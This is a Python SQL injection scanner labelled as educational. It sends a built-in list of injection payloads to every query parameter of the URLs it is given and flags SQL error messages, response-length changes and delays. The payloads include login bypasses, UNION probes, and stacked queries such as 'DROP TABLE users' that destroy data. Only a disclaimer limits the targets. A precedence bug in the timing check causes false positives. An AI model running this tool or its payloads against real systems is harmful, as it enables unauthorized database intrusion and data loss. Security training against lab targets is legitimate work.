#!/usr/bin/env python3
"""
============================================================
  SQL INJECTION SCANNER
  Educational Tool — Test only on DVWA, local apps, or
  targets you have explicit written permission to test.
============================================================
"""
import sys
sys.stdout.reconfigure(encoding='utf-8')
import requests
import argparse
import logging
import time
import json
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from datetime import datetime

# ─────────────────────────────────────────────
#  STEP 1: CONFIGURATION
#  All tunable settings live here so you can
#  adjust them without digging through the code.
# ─────────────────────────────────────────────

CONFIG = {
    "max_workers": 5,          # How many threads run at once
    "rate_limit_delay": 0.5,   # Seconds to wait between requests (rate limiting)
    "timeout": 10,             # HTTP timeout per request
    "log_file": "sqli_scan.log",
    "output_file": "sqli_results.json",
}

# ─────────────────────────────────────────────
#  STEP 2: SQL INJECTION PAYLOADS
#  These are the "probes" we send to inputs.
#  Each one tries to break or reveal SQL logic.
# ─────────────────────────────────────────────

PAYLOADS = [
    # --- Classic error-based ---
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin'--",
    "' OR 'x'='x",

    # --- Numeric context ---
    "1 OR 1=1",
    "1' OR '1'='1",
    "1 OR 1=1--",

    # --- Boolean blind ---
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 'a'='a",
    "' AND 'a'='b",

    # --- Time-based blind (detects delays) ---
    "'; WAITFOR DELAY '0:0:3'--",       # MSSQL
    "'; SELECT SLEEP(3)--",             # MySQL
    "1; SELECT pg_sleep(3)--",          # PostgreSQL

    # --- UNION-based ---
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",

    # --- Stacked queries ---
    "'; DROP TABLE users--",            # Classic (rarely works but tests stacking)
    "'; INSERT INTO users VALUES(1)--",

    # --- Comment variations ---
    "'--",
    "'#",
    "'/*",
]

# ─────────────────────────────────────────────
#  STEP 3: VULNERABILITY INDICATORS
#  After sending a payload, we look for these
#  patterns in the HTTP response to detect SQLi.
# ─────────────────────────────────────────────

ERROR_PATTERNS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"supplied argument is not a valid mysql",

    # MSSQL / SQL Server
    r"microsoft.*database",
    r"unclosed quotation mark",
    r"odbc.*driver",
    r"mssql_query",
    r"\[sql server\]",

    # Oracle
    r"ora-\d{4,5}",
    r"oracle.*error",

    # PostgreSQL
    r"postgresql.*error",
    r"pg_query",
    r"unterminated quoted string",

    # SQLite
    r"sqlite.*error",
    r"sqlite3.operationalerror",

    # Generic
    r"sql syntax",
    r"syntax error.*sql",
    r"quoted string not properly terminated",
    r"unexpected end of sql",
    r"sql command not properly ended",
]

# Compile all patterns once for speed
COMPILED_PATTERNS = [re.compile(p, re.IGNORECASE) for p in ERROR_PATTERNS]


# ─────────────────────────────────────────────
#  STEP 4: LOGGING SETUP
#  Writes scan activity to both console and file.
# ─────────────────────────────────────────────

def setup_logging():
    logger = logging.getLogger("sqli_scanner")
    logger.setLevel(logging.DEBUG)

    formatter = logging.Formatter(
        "[%(asctime)s] %(levelname)-8s %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )

    # Console handler
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    console.setFormatter(formatter)
    logger.addHandler(console)

    # File handler
    fh = logging.FileHandler(CONFIG["log_file"])
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(formatter)
    logger.addHandler(fh)

    return logger


logger = setup_logging()


# ─────────────────────────────────────────────
#  STEP 5: CORE SCANNER FUNCTIONS
# ─────────────────────────────────────────────

def fetch_baseline(url, params, session):
    """
    Get a 'normal' response before injecting anything.
    We use this to detect response-length changes (blind SQLi).
    """
    try:
        resp = session.get(url, params=params, timeout=CONFIG["timeout"])
        return resp.status_code, len(resp.text), resp.text
    except Exception as e:
        logger.warning(f"Baseline fetch failed for {url}: {e}")
        return None, None, None


def detect_sqli_in_response(response_text, payload, baseline_length):
    """
    Analyse the response for signs of SQL injection.
    Returns a dict with findings, or None if nothing found.
    """
    findings = []

    # 1. Check for database error messages
    for pattern in COMPILED_PATTERNS:
        if pattern.search(response_text):
            findings.append({
                "type": "error_based",
                "detail": f"DB error pattern matched: {pattern.pattern}"
            })
            break  # One match is enough to flag this

    # 2. Check for response length anomaly (possible blind SQLi)
    current_length = len(response_text)
    if baseline_length and abs(current_length - baseline_length) > 200:
        findings.append({
            "type": "length_anomaly",
            "detail": f"Response length changed: {baseline_length} → {current_length}"
        })

    # 3. Check for time-based blind (slow response)
    # (Handled separately with timing in probe_parameter)

    return findings if findings else None


def probe_parameter(url, param_name, all_params, session):
    """
    For ONE parameter in the URL, try every payload.
    Returns a list of vulnerability findings.
    """
    vulnerabilities = []

    # Get baseline before injecting
    base_status, base_length, base_text = fetch_baseline(url, all_params, session)

    for payload in PAYLOADS:
        time.sleep(CONFIG["rate_limit_delay"])  # ← RATE LIMITING

        # Build a copy of params with the injected value
        test_params = dict(all_params)
        test_params[param_name] = payload

        try:
            start_time = time.time()
            resp = session.get(url, params=test_params, timeout=CONFIG["timeout"])
            elapsed = time.time() - start_time

            logger.debug(f"[{param_name}] Payload: {repr(payload)} → HTTP {resp.status_code} ({elapsed:.2f}s)")

            findings = detect_sqli_in_response(resp.text, payload, base_length)

            # Time-based detection: response took > 2.5 seconds
            if elapsed >= 2.5 and "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                if findings is None:
                    findings = []
                findings.append({
                    "type": "time_based_blind",
                    "detail": f"Response delayed {elapsed:.2f}s with time-based payload"
                })

            if findings:
                vuln = {
                    "url": url,
                    "parameter": param_name,
                    "payload": payload,
                    "http_status": resp.status_code,
                    "response_time_s": round(elapsed, 3),
                    "findings": findings,
                }
                vulnerabilities.append(vuln)
                logger.warning(
                    f"⚠  POSSIBLE SQLi | param={param_name} | payload={repr(payload)} | "
                    f"type={findings[0]['type']}"
                )

        except requests.exceptions.Timeout:
            logger.debug(f"[{param_name}] Timeout with payload: {repr(payload)}")
        except requests.exceptions.RequestException as e:
            logger.debug(f"[{param_name}] Request error: {e}")

    return vulnerabilities


# ─────────────────────────────────────────────
#  STEP 6: CONCURRENCY — SCAN MULTIPLE PARAMS
#  We test each URL parameter in its own thread.
# ─────────────────────────────────────────────

def scan_url(url, session):
    """
    Parse the URL, find all query parameters,
    and test each one for SQL injection in parallel.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        logger.info(f"No query parameters found in: {url}")
        return []

    # Flatten parse_qs (returns lists) to single values
    flat_params = {k: v[0] for k, v in params.items()}
    logger.info(f"Scanning {url} | Parameters: {list(flat_params.keys())}")

    all_findings = []

    with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = {
            executor.submit(probe_parameter, url, param, flat_params, session): param
            for param in flat_params
        }
        for future in as_completed(futures):
            param = futures[future]
            try:
                results = future.result()
                all_findings.extend(results)
            except Exception as e:
                logger.error(f"Error scanning parameter '{param}': {e}")

    return all_findings


# ─────────────────────────────────────────────
#  STEP 7: POST-SCAN REPORTING
#  Summarise and save results to JSON.
# ─────────────────────────────────────────────

def generate_report(all_findings, scanned_urls):
    report = {
        "scan_metadata": {
            "timestamp": datetime.now().isoformat(),
            "total_urls_scanned": len(scanned_urls),
            "total_vulnerabilities_found": len(all_findings),
            "payloads_used": len(PAYLOADS),
        },
        "vulnerabilities": all_findings,
    }

    with open(CONFIG["output_file"], "w") as f:
        json.dump(report, f, indent=2)

    logger.info(f"\n{'='*55}")
    logger.info(f"  SCAN COMPLETE")
    logger.info(f"  URLs scanned    : {len(scanned_urls)}")
    logger.info(f"  Vulnerabilities : {len(all_findings)}")
    logger.info(f"  Results saved   : {CONFIG['output_file']}")
    logger.info(f"  Log saved       : {CONFIG['log_file']}")
    logger.info(f"{'='*55}")

    if all_findings:
        print("\n[!] VULNERABLE ENDPOINTS FOUND:")
        for v in all_findings:
            print(f"  → {v['url']} | param={v['parameter']} | type={v['findings'][0]['type']}")
    else:
        print("\n[✓] No obvious SQL injection indicators detected.")

    return report


# ─────────────────────────────────────────────
#  STEP 8: ENTRY POINT — CLI
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner — EDUCATIONAL USE ONLY"
    )
    parser.add_argument(
        "urls",
        nargs="+",
        help="Target URL(s) with query parameters. E.g.: http://localhost/dvwa/page.php?id=1"
    )
    parser.add_argument(
        "--workers", type=int, default=CONFIG["max_workers"],
        help="Number of concurrent threads (default: 5)"
    )
    parser.add_argument(
        "--delay", type=float, default=CONFIG["rate_limit_delay"],
        help="Delay between requests in seconds (default: 0.5)"
    )
    parser.add_argument(
        "--output", default=CONFIG["output_file"],
        help="Output JSON file name"
    )
    parser.add_argument(
        "--cookie",
        default=None,
        help='Session cookies. E.g.: --cookie "PHPSESSID=abc123; security=low"'
    )

    args = parser.parse_args()

    CONFIG["max_workers"] = args.workers
    CONFIG["rate_limit_delay"] = args.delay
    CONFIG["output_file"] = args.output

    print("""

         SQL INJECTION SCANNER v1.0               
  For educational use — DVWA / local apps only    

""")

    # Create a persistent session (reuses TCP connections)
    session = requests.Session()
    session.headers.update({
        "User-Agent": "SQLi-Scanner-Educational/1.0"
    })

    # ── Parse and attach cookies if provided ──
    if args.cookie:
        for part in args.cookie.split(";"):
            part = part.strip()
            if "=" in part:
                name, value = part.split("=", 1)
                session.cookies.set(name.strip(), value.strip())
        logger.info(f"Cookies loaded: {args.cookie}")

    all_findings = []
    for url in args.urls:
        findings = scan_url(url, session)
        all_findings.extend(findings)

    generate_report(all_findings, args.urls)


if __name__ == "__main__":
    main()